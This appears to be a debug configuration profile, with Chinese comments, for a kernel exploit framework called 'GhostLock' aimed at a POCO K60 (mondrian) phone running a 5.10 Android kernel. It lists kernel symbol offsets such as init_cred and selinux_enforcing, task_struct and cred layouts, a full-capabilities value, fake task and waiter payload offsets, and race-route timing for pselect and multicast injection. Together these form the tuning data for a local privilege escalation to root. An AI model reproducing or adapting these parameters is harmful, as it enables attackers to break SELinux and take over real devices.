# =============================================================================
# DEBUG ONLY — GhostLock mondrian (POCO 23013RK75C / K60) debug profile
#
# 设备：mondrian / b4541958 / Android 16 / kernel 5.10.252-gki-gabcbe4b2bc10
# 用途：debug 注入准备（**仅供 debug/注入准备**，不是 supported profile）。
#
# 逐字段来源（唯一物证，禁止臆造）：
#   1) 设备 profile `/sdcard/Download/k60-mondrian-20260531-full.conf`
#      （host 副本 /tmp/k60-mondrian-full.conf，schema_version=1）：
#      release/kernel_major/recommend_shizuku/kernel_phys_load/route.multicast_waiter
#      （前 5 个消费字段）/offset/task_struct/cred/kernelsnitch。
#   2) docs/analysis/mcast-510-probe.md（5.10 multicast probe PASS：waiter_off=96
#      buffer=264 task=48 lock=56 compact=1，与本文件 route 段一致）。
#   3) docs/analysis/select-510-probe.md（5.10 select probe PASS；本文件 select_stack
#      为 5.10 主路线，injection.primitive=pselect；multicast 仅保留几何/实验证据）。
#   4) docs/analysis/device-gates/cve43499-physical-mondrian-20261020-1950.md
#      （5.10 select route PASS target=0x1000 非安全目标；TCP ENOPROTOOPT 不支持；
#      perf app 域 Enforcing 拒/setenforce 0 可采样但 W2 target 未命中）。
#   5) legacy2（5.10 移植基线）源码常量：
#      generator.address_model/ payload/ multicast/pselect/tcp 段；
#      - payload：legacy2/core/target.h:225-272（LOCK_OFF=0xe80/W0_OFF=0x1180/
#        RIGHT_OFF=0x1240/LEFT_OFF=0x1260/FAKE_TASK_OFF=0x1280/TCP_FAKE_TASK_OFF=0x5800/
#        SKB_DATA_DELTA=-0xe80/FAKE_TASK_USAGE_OFF=0x40/FAKE_TASK_PRIO=120/
#        FAKE_WAITER_PRIO=140）、memory.cpp:176-224（write_value_offset=page_base+0x100、
#        page_accept_bit=16）；
#      - address_model：legacy2/core/target.h:14-23（kDirectMapBase=0xffffff8000000000、
#        kPhysicalOffset=0x80000000）；kernel_phys_load 取 full.conf 0xA8000000；
#      - multicast：legacy route_multicast.cpp:76-91（family@8=AF_UNSPEC）、
#        very_legacy/fops.c:66（futex waiter flag 0x80000000|pid）；
#      - pselect/tcp：legacy2 target.h PSELECT_ROUTE_NFDS=320 / tcp 常量；本文件
#        injection=pselect（5.10 select_stack 主路线；TCP 设备已知 ENOPROTOOPT，禁止选）。
#   6) kernel_phys_offset=0x80000000：**full.conf 无此键**，取 legacy 默认
#      `P0_PHYS_OFFSET`（legacy/tests/target_constants_test.cpp:14 static_assert +
#      历史设备日志 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000）。
#      evidence-based / UNVERIFIED，E1/W1 结果回填。
#
# 5.10 语义说明：
#   - mm_struct_sz=960（E0 /sys/kernel/slab/mm_struct/object_size=960、order=3、
#     objs_per_slab=34）；32768/960=34 **非整除** ⇒ placement 走 legacy floor 语义
#     （Lead 2026-10-27 裁定 (a)：允许 allocation % mm_struct_size != 0，objects=floor）。
#   - 本文件 route.multicast_waiter 内的 fake_lock_offset/fake_task_offset/
#     lock_slots_* 是 full.conf 的 legacy1 k5 geometry 附加字段；当前 loader 不消费
#     （本实现走 legacy2 payload 布局，见 generator.payload），仅留证。
#   - offset.mcast_fake_bss 同为 full.conf 附加字段；当前 DebugOffsets 无此字段、
#     W1 路径不使用，仅留证。
# =============================================================================

release = "5.10.252-gki-gabcbe4b2bc10"
schema_version = 1
kernel_major = 5
recommend_shizuku = 1
kernel_phys_load = 2818572288   # 0xA8000000（full.conf 直接值）
kernel_phys_offset = 2147483648 # 0x80000000（legacy 默认；full.conf 无此键）

route = [
  { multicast_waiter {
    waiter_off = 96
    buffer_size = 264
    task_offset = 48
    lock_offset = 56
    compact_waiter = 1
    # --- full.conf 附加（legacy1 k5 geometry；当前 loader 不消费，仅留证）---
    fake_lock_offset = 4608
    fake_task_offset = 12800
    lock_slots_offset = 128
    lock_slot_count = 12
    lock_slot_stride = 8
  } },
  # task-134/S3：5.10 select_stack lock anchor（dump_skip.zeroes，镜像相对偏移）。
  # 证据：/tmp/mondrian-boot_b.img sha256 9448f9…1713；dump_skip.zeroes @ +0x27dc7c8，
  # 0x1000 字节全零、.bss 可写、唯一直接引用 dump_skip 的 bulk-copy read；
  # stride=32 见 diting 5.10 kprobe 证据（+0x08/+0x10 写入、+0x18 后无访问 ⇒ 0x20）。
  { select_stack {
    compact_waiter = 1
    lock_anchor_image = 41797576
    lock_anchor_bytes = 4096
    lock_anchor_stride = 32
  } }
]

offset {
  init_task = 40542656
  init_cred = 40365808
  empty_zero_page = 41488384
  root_task_group = 41507584
  selinux_enforcing = 41846440
  selinux_blob_sizes = 35153680
  security_hook_heads = 35153704
  slide_nfulnl_logger = 39389696
  slide_boot_id = 41959753
  slide_loggers_0_1 = 39389472
  # full.conf 附加；当前 DebugOffsets 无此字段、W1 路径不使用（仅留证）。
  mcast_fake_bss = 41810296
}

task_struct {
  prio = 132
  normal_prio = 140
  sched_task_group = 784
  pi_lock = 2156
  pi_waiters = 2176
  pi_top_task = 2192
  pi_blocked_on = 2200
  pid = 1480
  tgid = 1484
  atomic_flags = 1424
  real_cred = 1912
  cred = 1920
  comm = 1936
  tasks = 1224
  seccomp = 2120
}

cred {
  # 5.10 cred_jar object_size=168（本机 root `/sys/kernel/slab/cred_jar/object_size`）；
  # 5.10 cred 布局：caps@40/count=5/usage@0；不再是 5.15 的 176/48/3。
  caps_offset = 40
  copy_size = 168
  usage_offset = 0
  usage_value = 256
  caps_count = 5
  caps_value = 2199023255551
  ref0_offset = 128
  ref1_offset = 136
  ref2_offset = 144
  # full.conf ref_count=3 ⇒ 无 ref3（不臆造第 4 个 ref 槽）。
  ref_count = 3
  ref0_image = -274704174840
  ref1_image = -274702745712
  ref2_image = -274704174848
}

kernelsnitch {
  collisions = 8
  mm_struct_sz = 960       # full.conf / E0 object_size=960（非 2 的幂；floor 语义）
}

# 单 route 注入选择：每次只走一条，不 fallback；mondrian 5.10 走 select_stack
# （multicast copy window 距 waiter slot 差 0x48，5.10 几何不可行；TCP 已知 ENOPROTOOPT）。
injection {
  primitive = "pselect"
  victim = "process"       # process(默认)|jni-spawn|common(opt-in, 公共 core VictimSession)；未知 fail-closed
}

generator {
  # task-119 临时实验键：W1 写目标覆盖（unset/null=原 writeTarget()；0x...=覆盖）。
  # 仅 debug；实验后移除。示例：write_target_override = "0x1000"
  # write_target_override = "0x1000"

  # ① image → direct-map 别名：((kernel_phys_load + symbol_off) - kernel_phys_offset)
  #    | direct_map_base；symbol_off 取上方 `offset.*`（相对 Image 文本基址）。
  address_model {
    direct_map_base = -549755813888   # 0xffffff8000000000（legacy2 kDirectMapBase）
    kernel_phys_load = 2818572288     # full.conf 0xA8000000
    kernel_phys_offset = 2147483648   # legacy P0_PHYS_OFFSET 0x80000000（待 E1 回填）
  }

  # ② 64 KiB 发送缓冲的槽位布局（compact waiter；legacy2 5.10 payload 常量）。
  payload {
    lock_off = 3712
    w0_off = 4480
    right_off = 4672
    left_off = 4704
    fake_task_off = 4736
    skb_data_delta = -3712
    skb_frag_bias = 0
    tcp_payload_delta = 0
    tcp_chunk_bias = 3712
    tcp_fake_task_off = 22528
    compact_waiter = 1
    fake_task_usage_off = 64
    fake_task_prio = 120
    fake_waiter_prio = 140
    # preserve_child（W1 zero 写）的写值相对候选页基址的偏移（memory.cpp:188 page_base+0x100）。
    write_value_offset = 256
    # selinux_state.initialized 在写值里的位下标（memory.cpp:222 ((right>>16)&1)）。
    page_accept_bit = 16
  }

  # ③ multicast：stamp 几何 + D3 ghost disarm（frame=full.conf buffer_size=264）。
  multicast {
    frame_size = 264
    family_offset = 8
    stamp_family = 0
    disarm_required = 1
    futex_waiter_flag = 2147483648
  }

  # ④ pselect：5.10 select_stack 主路线（waiter_shift=-2 / compact waiter；E1 待验证）。
  pselect {
    nfds = 320
    max_nfds = 320
    operation_budget = 4
    timeout_nanos = 800000000
    per_attempt_delay_ns = 0
    enter_delay_ns = 5000000
    fd_reserve_stride = 64
    select_use_timeval = 0
    waiter_shift = -2
  }

  # ⑤ tcp zerocopy：保留（设备已知 ENOPROTOOPT，禁止选）。
  tcp {
    mapping_size = 16777216
    max_mapping = 16777216
    frame_size = 64
    max_frame = 64
    receive_size = 64
    operation_budget = 2000
    timeout_nanos = 1000000000
    punch_spin = 10000000
    punch_phase_spin = 10000000
    post_hold_iterations = 20000
    arm_sequence = 16
    zc_address_offset = 24
    zc_length_offset = 32
    zc_task_offset = 40
    zc_lock_offset = 48
    send_fill_byte = 51
    mapping_fill_byte = 85
  }
}

# =============================================================================
# P1b-1：G01 fail-stop + G08 CPU pin（debug-only）
# =============================================================================
failStop {
  # 1=DIRTY/retained 结果先落 evidence/日志（flush）再强制终止（legacy exit_group(70) 同形）；
  # 0=只记录不终止（仅调试）。缺省=1；release 不读 debug 配置。
  enabled = 1
}

execution {
  # G08：owner/waiter 不 pin（-1 = Native u32 0xFFFFFFFF 哨兵）；consumer 保持 pin。
  # 首次真机门禁=只 pin consumer（legacy 同形），后续单变量 A/B 再开 owner/waiter pin。
  owner_cpu = -1
  waiter_cpu = -1
  consumer_cpu = 2
  # task-135/S4：diting 5.10 实测 park=30ms/settle=10ms/route_done=300s。
  race {
    park_timeout_ms = 30
    route_done_timeout_ms = 300000
    setup_settle_us = 10000
  }
}

# =============================================================================
# G05：fast-repair prebuild（debug-only；默认 false ⇒ 与既有行为完全一致）
# =============================================================================
writeChain {
  # 1=W1 出口预建 repair placement+landing（E6 显式打开；Native 零改动）。
  fast_repair_prebuild_enabled = 0
  # 1=prebuild clean failure 后允许 W2 完整 fallback（panic 窗口不改善）。
  allow_full_fallback = 0
}

# perf：保持默认关闭（G1 未过；5.10 设备 paranoid=-1 但 app 域采样证据仍不足）。
# =============================================================================
# B6：finish 派发前有界 settle（debug-only；默认 2000ms）
# =============================================================================
finish {
  # 派发前 settle（毫秒；0..10000；超界 fail-closed）。
  pre_dispatch_settle_ms = 2000
}

perf {
  enabled = 0
  attr {
    type = 1
    config = 0
    sample_period = 5000
    sample_type = 262145
    sample_regs_intr = 4294967295
    flags = 8
    disabled = 1
  }
  exclude {
    user = 1
    hv = 1
    idle = 1
  }
  auto_enable = 1
  ring_pages = 64
  pump_iterations = 128
  pump_budget_nanos = 1500000000
  max_passes = 3
  min_votes_floor = 64
  min_votes_ratio = 0.25
  task_alignment = 512
  register_count = 32
  sp_register_index = 31
  candidate_capacity = 256
  require_alignment = 0
  require_sp_evidence = 0
  settle_after_acquire_us = 50000
}
